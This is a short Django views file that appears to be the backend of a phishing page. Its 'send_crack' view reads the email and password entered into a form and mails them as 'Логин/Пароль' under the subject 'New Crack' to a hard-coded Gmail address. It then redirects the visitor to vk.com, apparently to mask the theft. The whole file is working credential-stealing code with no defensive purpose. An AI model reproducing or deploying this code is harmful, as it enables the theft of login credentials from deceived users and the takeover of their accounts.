from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

def index(request):
	return render(request, 'index.html', {'Access-Control-Allow-Origin' : '*'})
  
def send_crack(request):
	if request.method == 'POST':
		email = request.POST['email']
		password = request.POST['password']

		mail = f"Логин: {email}\nПароль: {password}"

	send_mail('New Crack', mail, settings.EMAIL_HOST_USER, ['denisperkov0@gmail.com'], fail_silently=False)

	return redirect('https://vk.com')
